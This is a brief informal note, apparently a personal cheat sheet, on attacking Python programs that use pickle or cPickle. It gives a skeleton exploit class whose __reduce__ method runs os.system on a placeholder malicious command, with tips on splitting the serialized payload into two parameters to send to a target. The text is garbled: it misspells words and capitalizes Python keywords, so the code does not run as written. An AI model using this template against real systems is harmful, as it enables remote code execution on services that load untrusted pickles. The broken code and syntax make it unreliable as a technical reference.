When I analyze a python code and I find keywords
Pickle
CPickle
Then I can perform a soure pickle attack
The general skeleton:





Import pickle
Import os


payload=<malicous_command>
Class Exploit(object):
  Def __reduce__(self):
   Return (os.system,(payload,))

result=cpickle.dumps(Exploit())

Remember there is nothing before cposix and nothing after “.” 
if your payload must be made of two parameters, put ‘!;’ before your  malicious command and after result=cpickle.dumps(Exploit()) 
perform splitting
param1,param2=result.split(“!”)
and now you can send to the target




